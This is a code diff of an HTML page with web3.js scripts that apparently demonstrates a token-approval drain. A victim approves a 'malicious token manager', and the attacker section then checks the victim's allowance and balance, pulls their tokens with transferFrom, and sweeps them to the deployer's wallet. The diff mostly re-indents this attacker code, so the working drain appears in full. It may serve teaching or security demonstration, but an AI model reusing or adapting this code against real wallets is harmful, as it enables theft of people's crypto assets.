@@ -339,6 +339,7 @@
 ];
     </script>
 
+
     <!-- Victim Section -->
     <div id="victimSection">
         <h2>Victim: Approve Malicious Token Manager</h2>
@@ -379,141 +380,122 @@
         </script>
     </div>
 
-<!-- Attacker Section -->
-<div id="attackerSection">
-    <h2>Attacker: Interact with Malicious Contract</h2>
-    <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
-    <span id="attackerStatus"></span> <!-- Add this line to show attacker's wallet status -->
-    <button id="checkAllowanceBtn" disabled>Check Allowance</button>
-    <button id="checkBalanceBtn" disabled>Check Victim's Balance</button> <!-- Added check balance button -->
-    <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
-    <button id="deployerWithdrawBtn" disabled>Deployer Withdraw</button>
+    <!-- Attacker Section -->
+    <div id="attackerSection">
+        <h2>Attacker: Interact with Malicious Contract</h2>
+        <button id="connectAttackerWalletBtn">Connect Attacker Wallet</button>
+        <span id="attackerStatus"></span> <!-- Add this line to show attacker's wallet status -->
+        <button id="checkAllowanceBtn" disabled>Check Allowance</button>
+        <button id="checkBalanceBtn" disabled>Check Victim's Balance</button> <!-- Added check balance button -->
+        <button id="transferTokensBtn" disabled>Withdraw Tokens</button>
+        <button id="deployerWithdrawBtn" disabled>Deployer Withdraw</button>
 
-    <h3>Instructions for Attacker:</h3>
-    <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
-</div>
+        <h3>Instructions for Attacker:</h3>
+        <p>Once the victim has approved the malicious contract, you can check the allowance, withdraw tokens from the victim's account, or withdraw tokens as the deployer.</p>
+    </div>
 
-<script>
-// Attacker wallet connection function
-document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
+    <script>
+        // Attacker wallet connection function
+        document.getElementById("connectAttackerWalletBtn").addEventListener("click", connectAttackerWallet);
 
-async function connectAttackerWallet() {
-    if (typeof window.ethereum !== 'undefined') {
-        // Request accounts access from MetaMask
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        web3 = new Web3(window.ethereum);
-        accounts = await web3.eth.getAccounts();
-        document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
+        async function connectAttackerWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                // Request accounts access from MetaMask
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                accounts = await web3.eth.getAccounts();
+                document.getElementById('attackerStatus').innerText = `Connected: ${accounts[0]}`;
 
-        // Initialize the malicious contract and token contract
-        contract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
-        tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+                // Initialize the malicious contract and token contract
+                contract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
+                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
 
-        // Enable the attacker's buttons once wallet is connected
-        document.getElementById("checkAllowanceBtn").disabled = false;
-        document.getElementById("checkBalanceBtn").disabled = false;
-        document.getElementById("transferTokensBtn").disabled = false;
-        document.getElementById("deployerWithdrawBtn").disabled = false;
-    } else {
-        alert("Please install MetaMask!");
-    }
-}
-
-// Check Allowance
-document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
-    const victimAddress = prompt("Enter victim's wallet address:");
-    if (victimAddress) {
-        try {
-            // Retrieve the allowance in the smallest unit (Wei equivalent for tokens with 18 decimals)
-            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            
-            // Convert to token units for human readability (adjust for 18 decimals)
-            const readableAllowance = web3.utils.fromWei(allowance, 'ether');  // Still use 'ether' because we treat token amounts as 'ether' for readability with 18 decimals
-            alert(`Allowance: ${readableAllowance} stk tokens granted.`);
-        } catch (error) {
-            alert("Error while checking allowance.");
-            console.error("Allowance Error:", error);
-        }
-    }
-});
-
-
-
-
-// Check Victim's Balance
-document.getElementById("checkBalanceBtn").addEventListener("click", async () => {
-    const victimAddress = prompt("Enter victim's wallet address:");
-    if (victimAddress) {
-        try {
-            // Retrieve the balance in the raw format (with 18 decimals)
-            const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-            
-            // Convert the raw balance to human-readable format (with 18 decimals)
-            const readableBalance = web3.utils.fromWei(balance, 'ether');
-            
-            // Show the readable balance
-            alert(`Victim's balance: ${readableBalance} tokens.`);
-        } catch (error) {
-            alert("Error while checking balance.");
-            console.error(error);
-        }
-    }
-});
-
-
-// Withdraw Tokens (from victim's address using the malicious contract)
-document.getElementById("transferTokensBtn").addEventListener("click", async () => {
-    const victimAddress = prompt("Enter victim's wallet address:");
-
-    if (victimAddress) {
-        try {
-            // Check if the victim has approved the malicious contract to spend tokens
-            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-            
-            // Calculate the amount to withdraw (minimum of allowance or balance)
-            const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
-
-            if (amountToWithdraw <= 0) {
-                alert("Insufficient allowance or balance to withdraw.");
-                return;
+                // Enable the attacker's buttons once wallet is connected
+                document.getElementById("checkAllowanceBtn").disabled = false;
+                document.getElementById("checkBalanceBtn").disabled = false;
+                document.getElementById("transferTokensBtn").disabled = false;
+                document.getElementById("deployerWithdrawBtn").disabled = false;
+            } else {
+                alert("Please install MetaMask!");
             }
-
-            // Convert the amount to the token's smallest unit (18 decimals for ERC20 tokens)
-            const amountInTokens = web3.utils.toBN(amountToWithdraw).mul(web3.utils.toBN('1000000000000000000')); // 10^18
-
-            // Perform the withdrawal from the victim's wallet to the malicious contract
-            const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
-
-            alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
-        } catch (error) {
-            alert("Error during withdrawal. Please check the details.");
-            console.error("Withdrawal Error:", error);
-            alert("Check the victim's approval, balance, and allowance.");
         }
-    }
-});
 
-// Deployer Withdraw (withdraw from the malicious contract balance to deployer's wallet)
-document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
-    const deployerAddress = accounts[0];
-    try {
-        const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
-        if (contractBalance > 0) {
-            // Transfer all tokens from the malicious contract to the deployer's wallet
-            await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
-            alert(`All tokens withdrawn to the deployer's address!`);
-        } else {
-            alert("No tokens available in the malicious contract.");
-        }
-    } catch (error) {
-        alert("Error while withdrawing tokens.");
-        console.error("Deployer Withdrawal Error:", error);
-    }
-});
+        // Check Allowance
+        document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
+            const victimAddress = prompt("Enter victim's wallet address:");
+            if (victimAddress) {
+                try {
+                    // Retrieve the allowance in the smallest unit (Wei equivalent for tokens with 18 decimals)
+                    const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                    // Convert to token units for human readability (adjust for 18 decimals)
+                    const readableAllowance = web3.utils.fromWei(allowance, 'ether');  // Still use 'ether' for readability
+                    alert(`Allowance: ${readableAllowance} stk tokens granted.`);
+                } catch (error) {
+                    alert("Error while checking allowance.");
+                    console.error("Allowance Error:", error);
+                }
+            }
+        });
 
+        // Check Victim's Balance
+        document.getElementById("checkBalanceBtn").addEventListener("click", async () => {
+            const victimAddress = prompt("Enter victim's wallet address:");
+            if (victimAddress) {
+                try {
+                    // Retrieve the balance in the raw format (with 18 decimals)
+                    const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+                    const readableBalance = web3.utils.fromWei(balance, 'ether');
+                    alert(`Victim's balance: ${readableBalance} tokens.`);
+                } catch (error) {
+                    alert("Error while checking balance.");
+                    console.error(error);
+                }
+            }
+        });
 
-</script>
+        // Withdraw Tokens (from victim's address using the malicious contract)
+        document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+            const victimAddress = prompt("Enter victim's wallet address:");
+
+            if (victimAddress) {
+                try {
+                    const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                    const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+                    const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
+
+                    if (amountToWithdraw <= 0) {
+                        alert("Insufficient allowance or balance to withdraw.");
+                        return;
+                    }
+
+                    const amountInTokens = web3.utils.toBN(amountToWithdraw).mul(web3.utils.toBN('1000000000000000000')); // 10^18
+
+                    const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
+
+                    alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
+                } catch (error) {
+                    alert("Error during withdrawal.");
+                    console.error("Withdrawal Error:", error);
+                }
+            }
+        });
+
+        // Deployer Withdraw (withdraw from the malicious contract balance to deployer's wallet)
+        document.getElementById("deployerWithdrawBtn").addEventListener("click", async () => {
+            const deployerAddress = accounts[0];
+            try {
+                const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
+                if (contractBalance > 0) {
+                    await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
+                    alert(`All tokens withdrawn to the deployer's address!`);
+                } else {
+                    alert("No tokens available in the malicious contract.");
+                }
+            } catch (error) {
+                alert("Error while withdrawing tokens.");
+                console.error("Deployer Withdrawal Error:", error);
+            }
+        });
+    </script>
 </body>
-
 </html>
